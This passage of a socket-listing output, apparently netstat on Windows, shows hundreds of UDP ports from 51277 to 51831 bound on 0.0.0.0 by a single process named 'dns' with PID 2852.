  UDP        0.0.0.0               51277         *:*                            2852              dns
  UDP        0.0.0.0               51278         *:*                            2852              dns
  UDP        0.0.0.0               51279         *:*                            2852              dns
  UDP        0.0.0.0               51280         *:*                            2852              dns
  UDP        0.0.0.0               51281         *:*                            2852              dns
  UDP        0.0.0.0               51282         *:*                            2852              dns
  UDP        0.0.0.0               51283         *:*                            2852              dns
  UDP        0.0.0.0               51284         *:*                            2852              dns
  UDP        0.0.0.0               51285         *:*                            2852              dns
  UDP        0.0.0.0               51286         *:*                            2852              dns
  UDP        0.0.0.0               51287         *:*                            2852              dns
  UDP        0.0.0.0               51288         *:*                            2852              dns
  UDP        0.0.0.0               51289         *:*                            2852              dns
  UDP        0.0.0.0               51290         *:*                            2852              dns
  UDP        0.0.0.0               51291         *:*                            2852              dns
  UDP        0.0.0.0               51292         *:*                            2852              dns
  UDP        0.0.0.0               51293         *:*                            2852              dns
  UDP        0.0.0.0               51294         *:*                            2852              dns
  UDP        0.0.0.0               51295         *:*                            2852              dns
  UDP        0.0.0.0               51296         *:*                            2852              dns
  UDP        0.0.0.0               51297         *:*                            2852              dns
  UDP        0.0.0.0               51298         *:*                            2852              dns
  UDP        0.0.0.0               51299         *:*                            2852              dns
  UDP        0.0.0.0               51300         *:*                            2852              dns
  UDP        0.0.0.0               51301         *:*                            2852              dns
  UDP        0.0.0.0               51302         *:*                            2852              dns
  UDP        0.0.0.0               51303         *:*                            2852              dns
  UDP        0.0.0.0               51304         *:*                            2852              dns
  UDP        0.0.0.0               51305         *:*                            2852              dns
  UDP        0.0.0.0               51306         *:*                            2852              dns
  UDP        0.0.0.0               51307         *:*                            2852              dns
  UDP        0.0.0.0               51308         *:*                            2852              dns
  UDP        0.0.0.0               51309         *:*                            2852              dns
  UDP        0.0.0.0               51310         *:*                            2852              dns
  UDP        0.0.0.0               51311         *:*                            2852              dns
  UDP        0.0.0.0               51312         *:*                            2852              dns
  UDP        0.0.0.0               51313         *:*                            2852              dns
  UDP        0.0.0.0               51314         *:*                            2852              dns
  UDP        0.0.0.0               51315         *:*                            2852              dns
  UDP        0.0.0.0               51316         *:*                            2852              dns
  UDP        0.0.0.0               51317         *:*                            2852              dns
  UDP        0.0.0.0               51318         *:*                            2852              dns
  UDP        0.0.0.0               51319         *:*                            2852              dns
  UDP        0.0.0.0               51320         *:*                            2852              dns
  UDP        0.0.0.0               51321         *:*                            2852              dns
  UDP        0.0.0.0               51322         *:*                            2852              dns
  UDP        0.0.0.0               51323         *:*                            2852              dns
  UDP        0.0.0.0               51324         *:*                            2852              dns
  UDP        0.0.0.0               51325         *:*                            2852              dns
  UDP        0.0.0.0               51326         *:*                            2852              dns
  UDP        0.0.0.0               51327         *:*                            2852              dns
  UDP        0.0.0.0               51328         *:*                            2852              dns
  UDP        0.0.0.0               51329         *:*                            2852              dns
  UDP        0.0.0.0               51330         *:*                            2852              dns
  UDP        0.0.0.0               51331         *:*                            2852              dns
  UDP        0.0.0.0               51332         *:*                            2852              dns
  UDP        0.0.0.0               51333         *:*                            2852              dns
  UDP        0.0.0.0               51334         *:*                            2852              dns
  UDP        0.0.0.0               51335         *:*                            2852              dns
  UDP        0.0.0.0               51336         *:*                            2852              dns
  UDP        0.0.0.0               51337         *:*                            2852              dns
  UDP        0.0.0.0               51338         *:*                            2852              dns
  UDP        0.0.0.0               51339         *:*                            2852              dns
  UDP        0.0.0.0               51340         *:*                            2852              dns
  UDP        0.0.0.0               51341         *:*                            2852              dns
  UDP        0.0.0.0               51342         *:*                            2852              dns
  UDP        0.0.0.0               51343         *:*                            2852              dns
  UDP        0.0.0.0               51344         *:*                            2852              dns
  UDP        0.0.0.0               51345         *:*                            2852              dns
  UDP        0.0.0.0               51346         *:*                            2852              dns
  UDP        0.0.0.0               51347         *:*                            2852              dns
  UDP        0.0.0.0               51348         *:*                            2852              dns
  UDP        0.0.0.0               51349         *:*                            2852              dns
  UDP        0.0.0.0               51350         *:*                            2852              dns
  UDP        0.0.0.0               51351         *:*                            2852              dns
  UDP        0.0.0.0               51352         *:*                            2852              dns
  UDP        0.0.0.0               51353         *:*                            2852              dns
  UDP        0.0.0.0               51354         *:*                            2852              dns
  UDP        0.0.0.0               51355         *:*                            2852              dns
  UDP        0.0.0.0               51356         *:*                            2852              dns
  UDP        0.0.0.0               51357         *:*                            2852              dns
  UDP        0.0.0.0               51358         *:*                            2852              dns
  UDP        0.0.0.0               51359         *:*                            2852              dns
  UDP        0.0.0.0               51360         *:*                            2852              dns
  UDP        0.0.0.0               51361         *:*                            2852              dns
  UDP        0.0.0.0               51362         *:*                            2852              dns
  UDP        0.0.0.0               51363         *:*                            2852              dns
  UDP        0.0.0.0               51364         *:*                            2852              dns
  UDP        0.0.0.0               51365         *:*                            2852              dns
  UDP        0.0.0.0               51366         *:*                            2852              dns
  UDP        0.0.0.0               51367         *:*                            2852              dns
  UDP        0.0.0.0               51368         *:*                            2852              dns
  UDP        0.0.0.0               51369         *:*                            2852              dns
  UDP        0.0.0.0               51370         *:*                            2852              dns
  UDP        0.0.0.0               51371         *:*                            2852              dns
  UDP        0.0.0.0               51372         *:*                            2852              dns
  UDP        0.0.0.0               51373         *:*                            2852              dns
  UDP        0.0.0.0               51374         *:*                            2852              dns
  UDP        0.0.0.0               51375         *:*                            2852              dns
  UDP        0.0.0.0               51376         *:*                            2852              dns
  UDP        0.0.0.0               51377         *:*                            2852              dns
  UDP        0.0.0.0               51378         *:*                            2852              dns
  UDP        0.0.0.0               51379         *:*                            2852              dns
  UDP        0.0.0.0               51380         *:*                            2852              dns
  UDP        0.0.0.0               51381         *:*                            2852              dns
  UDP        0.0.0.0               51382         *:*                            2852              dns
  UDP        0.0.0.0               51383         *:*                            2852              dns
  UDP        0.0.0.0               51384         *:*                            2852              dns
  UDP        0.0.0.0               51385         *:*                            2852              dns
  UDP        0.0.0.0               51386         *:*                            2852              dns
  UDP        0.0.0.0               51387         *:*                            2852              dns
  UDP        0.0.0.0               51388         *:*                            2852              dns
  UDP        0.0.0.0               51389         *:*                            2852              dns
  UDP        0.0.0.0               51390         *:*                            2852              dns
  UDP        0.0.0.0               51391         *:*                            2852              dns
  UDP        0.0.0.0               51392         *:*                            2852              dns
  UDP        0.0.0.0               51393         *:*                            2852              dns
  UDP        0.0.0.0               51394         *:*                            2852              dns
  UDP        0.0.0.0               51395         *:*                            2852              dns
  UDP        0.0.0.0               51396         *:*                            2852              dns
  UDP        0.0.0.0               51397         *:*                            2852              dns
  UDP        0.0.0.0               51398         *:*                            2852              dns
  UDP        0.0.0.0               51399         *:*                            2852              dns
  UDP        0.0.0.0               51400         *:*                            2852              dns
  UDP        0.0.0.0               51401         *:*                            2852              dns
  UDP        0.0.0.0               51402         *:*                            2852              dns
  UDP        0.0.0.0               51403         *:*                            2852              dns
  UDP        0.0.0.0               51404         *:*                            2852              dns
  UDP        0.0.0.0               51405         *:*                            2852              dns
  UDP        0.0.0.0               51406         *:*                            2852              dns
  UDP        0.0.0.0               51407         *:*                            2852              dns
  UDP        0.0.0.0               51408         *:*                            2852              dns
  UDP        0.0.0.0               51409         *:*                            2852              dns
  UDP        0.0.0.0               51410         *:*                            2852              dns
  UDP        0.0.0.0               51411         *:*                            2852              dns
  UDP        0.0.0.0               51412         *:*                            2852              dns
  UDP        0.0.0.0               51413         *:*                            2852              dns
  UDP        0.0.0.0               51414         *:*                            2852              dns
  UDP        0.0.0.0               51415         *:*                            2852              dns
  UDP        0.0.0.0               51416         *:*                            2852              dns
  UDP        0.0.0.0               51417         *:*                            2852              dns
  UDP        0.0.0.0               51418         *:*                            2852              dns
  UDP        0.0.0.0               51419         *:*                            2852              dns
  UDP        0.0.0.0               51420         *:*                            2852              dns
  UDP        0.0.0.0               51421         *:*                            2852              dns
  UDP        0.0.0.0               51422         *:*                            2852              dns
  UDP        0.0.0.0               51423         *:*                            2852              dns
  UDP        0.0.0.0               51424         *:*                            2852              dns
  UDP        0.0.0.0               51425         *:*                            2852              dns
  UDP        0.0.0.0               51426         *:*                            2852              dns
  UDP        0.0.0.0               51427         *:*                            2852              dns
  UDP        0.0.0.0               51428         *:*                            2852              dns
  UDP        0.0.0.0               51429         *:*                            2852              dns
  UDP        0.0.0.0               51430         *:*                            2852              dns
  UDP        0.0.0.0               51431         *:*                            2852              dns
  UDP        0.0.0.0               51432         *:*                            2852              dns
  UDP        0.0.0.0               51433         *:*                            2852              dns
  UDP        0.0.0.0               51434         *:*                            2852              dns
  UDP        0.0.0.0               51435         *:*                            2852              dns
  UDP        0.0.0.0               51436         *:*                            2852              dns
  UDP        0.0.0.0               51437         *:*                            2852              dns
  UDP        0.0.0.0               51438         *:*                            2852              dns
  UDP        0.0.0.0               51439         *:*                            2852              dns
  UDP        0.0.0.0               51440         *:*                            2852              dns
  UDP        0.0.0.0               51441         *:*                            2852              dns
  UDP        0.0.0.0               51442         *:*                            2852              dns
  UDP        0.0.0.0               51443         *:*                            2852              dns
  UDP        0.0.0.0               51444         *:*                            2852              dns
  UDP        0.0.0.0               51445         *:*                            2852              dns
  UDP        0.0.0.0               51446         *:*                            2852              dns
  UDP        0.0.0.0               51447         *:*                            2852              dns
  UDP        0.0.0.0               51448         *:*                            2852              dns
  UDP        0.0.0.0               51449         *:*                            2852              dns
  UDP        0.0.0.0               51450         *:*                            2852              dns
  UDP        0.0.0.0               51451         *:*                            2852              dns
  UDP        0.0.0.0               51452         *:*                            2852              dns
  UDP        0.0.0.0               51453         *:*                            2852              dns
  UDP        0.0.0.0               51454         *:*                            2852              dns
  UDP        0.0.0.0               51455         *:*                            2852              dns
  UDP        0.0.0.0               51456         *:*                            2852              dns
  UDP        0.0.0.0               51457         *:*                            2852              dns
  UDP        0.0.0.0               51458         *:*                            2852              dns
  UDP        0.0.0.0               51459         *:*                            2852              dns
  UDP        0.0.0.0               51460         *:*                            2852              dns
  UDP        0.0.0.0               51461         *:*                            2852              dns
  UDP        0.0.0.0               51462         *:*                            2852              dns
  UDP        0.0.0.0               51463         *:*                            2852              dns
  UDP        0.0.0.0               51464         *:*                            2852              dns
  UDP        0.0.0.0               51465         *:*                            2852              dns
  UDP        0.0.0.0               51466         *:*                            2852              dns
  UDP        0.0.0.0               51467         *:*                            2852              dns
  UDP        0.0.0.0               51468         *:*                            2852              dns
  UDP        0.0.0.0               51469         *:*                            2852              dns
  UDP        0.0.0.0               51470         *:*                            2852              dns
  UDP        0.0.0.0               51471         *:*                            2852              dns
  UDP        0.0.0.0               51472         *:*                            2852              dns
  UDP        0.0.0.0               51473         *:*                            2852              dns
  UDP        0.0.0.0               51474         *:*                            2852              dns
  UDP        0.0.0.0               51475         *:*                            2852              dns
  UDP        0.0.0.0               51476         *:*                            2852              dns
  UDP        0.0.0.0               51477         *:*                            2852              dns
  UDP        0.0.0.0               51478         *:*                            2852              dns
  UDP        0.0.0.0               51479         *:*                            2852              dns
  UDP        0.0.0.0               51480         *:*                            2852              dns
  UDP        0.0.0.0               51481         *:*                            2852              dns
  UDP        0.0.0.0               51482         *:*                            2852              dns
  UDP        0.0.0.0               51483         *:*                            2852              dns
  UDP        0.0.0.0               51484         *:*                            2852              dns
  UDP        0.0.0.0               51485         *:*                            2852              dns
  UDP        0.0.0.0               51486         *:*                            2852              dns
  UDP        0.0.0.0               51487         *:*                            2852              dns
  UDP        0.0.0.0               51488         *:*                            2852              dns
  UDP        0.0.0.0               51489         *:*                            2852              dns
  UDP        0.0.0.0               51490         *:*                            2852              dns
  UDP        0.0.0.0               51491         *:*                            2852              dns
  UDP        0.0.0.0               51492         *:*                            2852              dns
  UDP        0.0.0.0               51493         *:*                            2852              dns
  UDP        0.0.0.0               51494         *:*                            2852              dns
  UDP        0.0.0.0               51495         *:*                            2852              dns
  UDP        0.0.0.0               51496         *:*                            2852              dns
  UDP        0.0.0.0               51497         *:*                            2852              dns
  UDP        0.0.0.0               51498         *:*                            2852              dns
  UDP        0.0.0.0               51499         *:*                            2852              dns
  UDP        0.0.0.0               51500         *:*                            2852              dns
  UDP        0.0.0.0               51501         *:*                            2852              dns
  UDP        0.0.0.0               51502         *:*                            2852              dns
  UDP        0.0.0.0               51503         *:*                            2852              dns
  UDP        0.0.0.0               51504         *:*                            2852              dns
  UDP        0.0.0.0               51505         *:*                            2852              dns
  UDP        0.0.0.0               51506         *:*                            2852              dns
  UDP        0.0.0.0               51507         *:*                            2852              dns
  UDP        0.0.0.0               51508         *:*                            2852              dns
  UDP        0.0.0.0               51509         *:*                            2852              dns
  UDP        0.0.0.0               51510         *:*                            2852              dns
  UDP        0.0.0.0               51511         *:*                            2852              dns
  UDP        0.0.0.0               51512         *:*                            2852              dns
  UDP        0.0.0.0               51513         *:*                            2852              dns
  UDP        0.0.0.0               51514         *:*                            2852              dns
  UDP        0.0.0.0               51515         *:*                            2852              dns
  UDP        0.0.0.0               51516         *:*                            2852              dns
  UDP        0.0.0.0               51517         *:*                            2852              dns
  UDP        0.0.0.0               51518         *:*                            2852              dns
  UDP        0.0.0.0               51519         *:*                            2852              dns
  UDP        0.0.0.0               51520         *:*                            2852              dns
  UDP        0.0.0.0               51521         *:*                            2852              dns
  UDP        0.0.0.0               51522         *:*                            2852              dns
  UDP        0.0.0.0               51523         *:*                            2852              dns
  UDP        0.0.0.0               51524         *:*                            2852              dns
  UDP        0.0.0.0               51525         *:*                            2852              dns
  UDP        0.0.0.0               51526         *:*                            2852              dns
  UDP        0.0.0.0               51527         *:*                            2852              dns
  UDP        0.0.0.0               51528         *:*                            2852              dns
  UDP        0.0.0.0               51529         *:*                            2852              dns
  UDP        0.0.0.0               51530         *:*                            2852              dns
  UDP        0.0.0.0               51531         *:*                            2852              dns
  UDP        0.0.0.0               51532         *:*                            2852              dns
  UDP        0.0.0.0               51533         *:*                            2852              dns
  UDP        0.0.0.0               51534         *:*                            2852              dns
  UDP        0.0.0.0               51535         *:*                            2852              dns
  UDP        0.0.0.0               51536         *:*                            2852              dns
  UDP        0.0.0.0               51537         *:*                            2852              dns
  UDP        0.0.0.0               51538         *:*                            2852              dns
  UDP        0.0.0.0               51539         *:*                            2852              dns
  UDP        0.0.0.0               51540         *:*                            2852              dns
  UDP        0.0.0.0               51541         *:*                            2852              dns
  UDP        0.0.0.0               51542         *:*                            2852              dns
  UDP        0.0.0.0               51543         *:*                            2852              dns
  UDP        0.0.0.0               51544         *:*                            2852              dns
  UDP        0.0.0.0               51545         *:*                            2852              dns
  UDP        0.0.0.0               51546         *:*                            2852              dns
  UDP        0.0.0.0               51547         *:*                            2852              dns
  UDP        0.0.0.0               51548         *:*                            2852              dns
  UDP        0.0.0.0               51549         *:*                            2852              dns
  UDP        0.0.0.0               51550         *:*                            2852              dns
  UDP        0.0.0.0               51551         *:*                            2852              dns
  UDP        0.0.0.0               51552         *:*                            2852              dns
  UDP        0.0.0.0               51553         *:*                            2852              dns
  UDP        0.0.0.0               51554         *:*                            2852              dns
  UDP        0.0.0.0               51555         *:*                            2852              dns
  UDP        0.0.0.0               51556         *:*                            2852              dns
  UDP        0.0.0.0               51557         *:*                            2852              dns
  UDP        0.0.0.0               51558         *:*                            2852              dns
  UDP        0.0.0.0               51559         *:*                            2852              dns
  UDP        0.0.0.0               51560         *:*                            2852              dns
  UDP        0.0.0.0               51561         *:*                            2852              dns
  UDP        0.0.0.0               51562         *:*                            2852              dns
  UDP        0.0.0.0               51563         *:*                            2852              dns
  UDP        0.0.0.0               51564         *:*                            2852              dns
  UDP        0.0.0.0               51565         *:*                            2852              dns
  UDP        0.0.0.0               51566         *:*                            2852              dns
  UDP        0.0.0.0               51567         *:*                            2852              dns
  UDP        0.0.0.0               51568         *:*                            2852              dns
  UDP        0.0.0.0               51569         *:*                            2852              dns
  UDP        0.0.0.0               51570         *:*                            2852              dns
  UDP        0.0.0.0               51571         *:*                            2852              dns
  UDP        0.0.0.0               51572         *:*                            2852              dns
  UDP        0.0.0.0               51573         *:*                            2852              dns
  UDP        0.0.0.0               51574         *:*                            2852              dns
  UDP        0.0.0.0               51575         *:*                            2852              dns
  UDP        0.0.0.0               51576         *:*                            2852              dns
  UDP        0.0.0.0               51577         *:*                            2852              dns
  UDP        0.0.0.0               51578         *:*                            2852              dns
  UDP        0.0.0.0               51579         *:*                            2852              dns
  UDP        0.0.0.0               51580         *:*                            2852              dns
  UDP        0.0.0.0               51581         *:*                            2852              dns
  UDP        0.0.0.0               51582         *:*                            2852              dns
  UDP        0.0.0.0               51583         *:*                            2852              dns
  UDP        0.0.0.0               51584         *:*                            2852              dns
  UDP        0.0.0.0               51585         *:*                            2852              dns
  UDP        0.0.0.0               51586         *:*                            2852              dns
  UDP        0.0.0.0               51587         *:*                            2852              dns
  UDP        0.0.0.0               51588         *:*                            2852              dns
  UDP        0.0.0.0               51589         *:*                            2852              dns
  UDP        0.0.0.0               51590         *:*                            2852              dns
  UDP        0.0.0.0               51591         *:*                            2852              dns
  UDP        0.0.0.0               51592         *:*                            2852              dns
  UDP        0.0.0.0               51593         *:*                            2852              dns
  UDP        0.0.0.0               51594         *:*                            2852              dns
  UDP        0.0.0.0               51595         *:*                            2852              dns
  UDP        0.0.0.0               51596         *:*                            2852              dns
  UDP        0.0.0.0               51597         *:*                            2852              dns
  UDP        0.0.0.0               51598         *:*                            2852              dns
  UDP        0.0.0.0               51599         *:*                            2852              dns
  UDP        0.0.0.0               51600         *:*                            2852              dns
  UDP        0.0.0.0               51601         *:*                            2852              dns
  UDP        0.0.0.0               51602         *:*                            2852              dns
  UDP        0.0.0.0               51603         *:*                            2852              dns
  UDP        0.0.0.0               51604         *:*                            2852              dns
  UDP        0.0.0.0               51605         *:*                            2852              dns
  UDP        0.0.0.0               51606         *:*                            2852              dns
  UDP        0.0.0.0               51607         *:*                            2852              dns
  UDP        0.0.0.0               51608         *:*                            2852              dns
  UDP        0.0.0.0               51609         *:*                            2852              dns
  UDP        0.0.0.0               51610         *:*                            2852              dns
  UDP        0.0.0.0               51611         *:*                            2852              dns
  UDP        0.0.0.0               51612         *:*                            2852              dns
  UDP        0.0.0.0               51613         *:*                            2852              dns
  UDP        0.0.0.0               51614         *:*                            2852              dns
  UDP        0.0.0.0               51615         *:*                            2852              dns
  UDP        0.0.0.0               51616         *:*                            2852              dns
  UDP        0.0.0.0               51617         *:*                            2852              dns
  UDP        0.0.0.0               51618         *:*                            2852              dns
  UDP        0.0.0.0               51619         *:*                            2852              dns
  UDP        0.0.0.0               51620         *:*                            2852              dns
  UDP        0.0.0.0               51621         *:*                            2852              dns
  UDP        0.0.0.0               51622         *:*                            2852              dns
  UDP        0.0.0.0               51623         *:*                            2852              dns
  UDP        0.0.0.0               51624         *:*                            2852              dns
  UDP        0.0.0.0               51625         *:*                            2852              dns
  UDP        0.0.0.0               51626         *:*                            2852              dns
  UDP        0.0.0.0               51627         *:*                            2852              dns
  UDP        0.0.0.0               51628         *:*                            2852              dns
  UDP        0.0.0.0               51629         *:*                            2852              dns
  UDP        0.0.0.0               51630         *:*                            2852              dns
  UDP        0.0.0.0               51631         *:*                            2852              dns
  UDP        0.0.0.0               51632         *:*                            2852              dns
  UDP        0.0.0.0               51633         *:*                            2852              dns
  UDP        0.0.0.0               51634         *:*                            2852              dns
  UDP        0.0.0.0               51635         *:*                            2852              dns
  UDP        0.0.0.0               51636         *:*                            2852              dns
  UDP        0.0.0.0               51637         *:*                            2852              dns
  UDP        0.0.0.0               51638         *:*                            2852              dns
  UDP        0.0.0.0               51639         *:*                            2852              dns
  UDP        0.0.0.0               51640         *:*                            2852              dns
  UDP        0.0.0.0               51641         *:*                            2852              dns
  UDP        0.0.0.0               51642         *:*                            2852              dns
  UDP        0.0.0.0               51643         *:*                            2852              dns
  UDP        0.0.0.0               51644         *:*                            2852              dns
  UDP        0.0.0.0               51645         *:*                            2852              dns
  UDP        0.0.0.0               51646         *:*                            2852              dns
  UDP        0.0.0.0               51647         *:*                            2852              dns
  UDP        0.0.0.0               51648         *:*                            2852              dns
  UDP        0.0.0.0               51649         *:*                            2852              dns
  UDP        0.0.0.0               51650         *:*                            2852              dns
  UDP        0.0.0.0               51651         *:*                            2852              dns
  UDP        0.0.0.0               51652         *:*                            2852              dns
  UDP        0.0.0.0               51653         *:*                            2852              dns
  UDP        0.0.0.0               51654         *:*                            2852              dns
  UDP        0.0.0.0               51655         *:*                            2852              dns
  UDP        0.0.0.0               51656         *:*                            2852              dns
  UDP        0.0.0.0               51657         *:*                            2852              dns
  UDP        0.0.0.0               51658         *:*                            2852              dns
  UDP        0.0.0.0               51659         *:*                            2852              dns
  UDP        0.0.0.0               51660         *:*                            2852              dns
  UDP        0.0.0.0               51661         *:*                            2852              dns
  UDP        0.0.0.0               51662         *:*                            2852              dns
  UDP        0.0.0.0               51663         *:*                            2852              dns
  UDP        0.0.0.0               51664         *:*                            2852              dns
  UDP        0.0.0.0               51665         *:*                            2852              dns
  UDP        0.0.0.0               51666         *:*                            2852              dns
  UDP        0.0.0.0               51667         *:*                            2852              dns
  UDP        0.0.0.0               51668         *:*                            2852              dns
  UDP        0.0.0.0               51669         *:*                            2852              dns
  UDP        0.0.0.0               51670         *:*                            2852              dns
  UDP        0.0.0.0               51671         *:*                            2852              dns
  UDP        0.0.0.0               51672         *:*                            2852              dns
  UDP        0.0.0.0               51673         *:*                            2852              dns
  UDP        0.0.0.0               51674         *:*                            2852              dns
  UDP        0.0.0.0               51675         *:*                            2852              dns
  UDP        0.0.0.0               51676         *:*                            2852              dns
  UDP        0.0.0.0               51677         *:*                            2852              dns
  UDP        0.0.0.0               51678         *:*                            2852              dns
  UDP        0.0.0.0               51679         *:*                            2852              dns
  UDP        0.0.0.0               51680         *:*                            2852              dns
  UDP        0.0.0.0               51681         *:*                            2852              dns
  UDP        0.0.0.0               51682         *:*                            2852              dns
  UDP        0.0.0.0               51683         *:*                            2852              dns
  UDP        0.0.0.0               51684         *:*                            2852              dns
  UDP        0.0.0.0               51685         *:*                            2852              dns
  UDP        0.0.0.0               51686         *:*                            2852              dns
  UDP        0.0.0.0               51687         *:*                            2852              dns
  UDP        0.0.0.0               51688         *:*                            2852              dns
  UDP        0.0.0.0               51689         *:*                            2852              dns
  UDP        0.0.0.0               51690         *:*                            2852              dns
  UDP        0.0.0.0               51691         *:*                            2852              dns
  UDP        0.0.0.0               51692         *:*                            2852              dns
  UDP        0.0.0.0               51693         *:*                            2852              dns
  UDP        0.0.0.0               51694         *:*                            2852              dns
  UDP        0.0.0.0               51695         *:*                            2852              dns
  UDP        0.0.0.0               51696         *:*                            2852              dns
  UDP        0.0.0.0               51697         *:*                            2852              dns
  UDP        0.0.0.0               51698         *:*                            2852              dns
  UDP        0.0.0.0               51699         *:*                            2852              dns
  UDP        0.0.0.0               51700         *:*                            2852              dns
  UDP        0.0.0.0               51701         *:*                            2852              dns
  UDP        0.0.0.0               51702         *:*                            2852              dns
  UDP        0.0.0.0               51703         *:*                            2852              dns
  UDP        0.0.0.0               51704         *:*                            2852              dns
  UDP        0.0.0.0               51705         *:*                            2852              dns
  UDP        0.0.0.0               51706         *:*                            2852              dns
  UDP        0.0.0.0               51707         *:*                            2852              dns
  UDP        0.0.0.0               51708         *:*                            2852              dns
  UDP        0.0.0.0               51709         *:*                            2852              dns
  UDP        0.0.0.0               51710         *:*                            2852              dns
  UDP        0.0.0.0               51711         *:*                            2852              dns
  UDP        0.0.0.0               51712         *:*                            2852              dns
  UDP        0.0.0.0               51713         *:*                            2852              dns
  UDP        0.0.0.0               51714         *:*                            2852              dns
  UDP        0.0.0.0               51715         *:*                            2852              dns
  UDP        0.0.0.0               51716         *:*                            2852              dns
  UDP        0.0.0.0               51717         *:*                            2852              dns
  UDP        0.0.0.0               51718         *:*                            2852              dns
  UDP        0.0.0.0               51719         *:*                            2852              dns
  UDP        0.0.0.0               51720         *:*                            2852              dns
  UDP        0.0.0.0               51721         *:*                            2852              dns
  UDP        0.0.0.0               51722         *:*                            2852              dns
  UDP        0.0.0.0               51723         *:*                            2852              dns
  UDP        0.0.0.0               51724         *:*                            2852              dns
  UDP        0.0.0.0               51725         *:*                            2852              dns
  UDP        0.0.0.0               51726         *:*                            2852              dns
  UDP        0.0.0.0               51727         *:*                            2852              dns
  UDP        0.0.0.0               51728         *:*                            2852              dns
  UDP        0.0.0.0               51729         *:*                            2852              dns
  UDP        0.0.0.0               51730         *:*                            2852              dns
  UDP        0.0.0.0               51731         *:*                            2852              dns
  UDP        0.0.0.0               51732         *:*                            2852              dns
  UDP        0.0.0.0               51733         *:*                            2852              dns
  UDP        0.0.0.0               51734         *:*                            2852              dns
  UDP        0.0.0.0               51735         *:*                            2852              dns
  UDP        0.0.0.0               51736         *:*                            2852              dns
  UDP        0.0.0.0               51737         *:*                            2852              dns
  UDP        0.0.0.0               51738         *:*                            2852              dns
  UDP        0.0.0.0               51739         *:*                            2852              dns
  UDP        0.0.0.0               51740         *:*                            2852              dns
  UDP        0.0.0.0               51741         *:*                            2852              dns
  UDP        0.0.0.0               51742         *:*                            2852              dns
  UDP        0.0.0.0               51743         *:*                            2852              dns
  UDP        0.0.0.0               51744         *:*                            2852              dns
  UDP        0.0.0.0               51745         *:*                            2852              dns
  UDP        0.0.0.0               51746         *:*                            2852              dns
  UDP        0.0.0.0               51747         *:*                            2852              dns
  UDP        0.0.0.0               51748         *:*                            2852              dns
  UDP        0.0.0.0               51749         *:*                            2852              dns
  UDP        0.0.0.0               51750         *:*                            2852              dns
  UDP        0.0.0.0               51751         *:*                            2852              dns
  UDP        0.0.0.0               51752         *:*                            2852              dns
  UDP        0.0.0.0               51753         *:*                            2852              dns
  UDP        0.0.0.0               51754         *:*                            2852              dns
  UDP        0.0.0.0               51755         *:*                            2852              dns
  UDP        0.0.0.0               51756         *:*                            2852              dns
  UDP        0.0.0.0               51757         *:*                            2852              dns
  UDP        0.0.0.0               51758         *:*                            2852              dns
  UDP        0.0.0.0               51759         *:*                            2852              dns
  UDP        0.0.0.0               51760         *:*                            2852              dns
  UDP        0.0.0.0               51761         *:*                            2852              dns
  UDP        0.0.0.0               51762         *:*                            2852              dns
  UDP        0.0.0.0               51763         *:*                            2852              dns
  UDP        0.0.0.0               51764         *:*                            2852              dns
  UDP        0.0.0.0               51765         *:*                            2852              dns
  UDP        0.0.0.0               51766         *:*                            2852              dns
  UDP        0.0.0.0               51767         *:*                            2852              dns
  UDP        0.0.0.0               51768         *:*                            2852              dns
  UDP        0.0.0.0               51769         *:*                            2852              dns
  UDP        0.0.0.0               51770         *:*                            2852              dns
  UDP        0.0.0.0               51771         *:*                            2852              dns
  UDP        0.0.0.0               51772         *:*                            2852              dns
  UDP        0.0.0.0               51773         *:*                            2852              dns
  UDP        0.0.0.0               51774         *:*                            2852              dns
  UDP        0.0.0.0               51775         *:*                            2852              dns
  UDP        0.0.0.0               51776         *:*                            2852              dns
  UDP        0.0.0.0               51777         *:*                            2852              dns
  UDP        0.0.0.0               51778         *:*                            2852              dns
  UDP        0.0.0.0               51779         *:*                            2852              dns
  UDP        0.0.0.0               51780         *:*                            2852              dns
  UDP        0.0.0.0               51781         *:*                            2852              dns
  UDP        0.0.0.0               51782         *:*                            2852              dns
  UDP        0.0.0.0               51783         *:*                            2852              dns
  UDP        0.0.0.0               51784         *:*                            2852              dns
  UDP        0.0.0.0               51785         *:*                            2852              dns
  UDP        0.0.0.0               51786         *:*                            2852              dns
  UDP        0.0.0.0               51787         *:*                            2852              dns
  UDP        0.0.0.0               51788         *:*                            2852              dns
  UDP        0.0.0.0               51789         *:*                            2852              dns
  UDP        0.0.0.0               51790         *:*                            2852              dns
  UDP        0.0.0.0               51791         *:*                            2852              dns
  UDP        0.0.0.0               51792         *:*                            2852              dns
  UDP        0.0.0.0               51793         *:*                            2852              dns
  UDP        0.0.0.0               51794         *:*                            2852              dns
  UDP        0.0.0.0               51795         *:*                            2852              dns
  UDP        0.0.0.0               51796         *:*                            2852              dns
  UDP        0.0.0.0               51797         *:*                            2852              dns
  UDP        0.0.0.0               51798         *:*                            2852              dns
  UDP        0.0.0.0               51799         *:*                            2852              dns
  UDP        0.0.0.0               51800         *:*                            2852              dns
  UDP        0.0.0.0               51801         *:*                            2852              dns
  UDP        0.0.0.0               51802         *:*                            2852              dns
  UDP        0.0.0.0               51803         *:*                            2852              dns
  UDP        0.0.0.0               51804         *:*                            2852              dns
  UDP        0.0.0.0               51805         *:*                            2852              dns
  UDP        0.0.0.0               51806         *:*                            2852              dns
  UDP        0.0.0.0               51807         *:*                            2852              dns
  UDP        0.0.0.0               51808         *:*                            2852              dns
  UDP        0.0.0.0               51809         *:*                            2852              dns
  UDP        0.0.0.0               51810         *:*                            2852              dns
  UDP        0.0.0.0               51811         *:*                            2852              dns
  UDP        0.0.0.0               51812         *:*                            2852              dns
  UDP        0.0.0.0               51813         *:*                            2852              dns
  UDP        0.0.0.0               51814         *:*                            2852              dns
  UDP        0.0.0.0               51815         *:*                            2852              dns
  UDP        0.0.0.0               51816         *:*                            2852              dns
  UDP        0.0.0.0               51817         *:*                            2852              dns
  UDP        0.0.0.0               51818         *:*                            2852              dns
  UDP        0.0.0.0               51819         *:*                            2852              dns
  UDP        0.0.0.0               51820         *:*                            2852              dns
  UDP        0.0.0.0               51821         *:*                            2852              dns
  UDP        0.0.0.0               51822         *:*                            2852              dns
  UDP        0.0.0.0               51823         *:*                            2852              dns
  UDP        0.0.0.0               51824         *:*                            2852              dns
  UDP        0.0.0.0               51825         *:*                            2852              dns
  UDP        0.0.0.0               51826         *:*                            2852              dns
  UDP        0.0.0.0               51827         *:*                            2852              dns
  UDP        0.0.0.0               51828         *:*                            2852              dns
  UDP        0.0.0.0               51829         *:*                            2852              dns
  UDP        0.0.0.0               51830         *:*                            2852              dns
  UDP        0.0.0.0               51831         *:*                            2852              dns
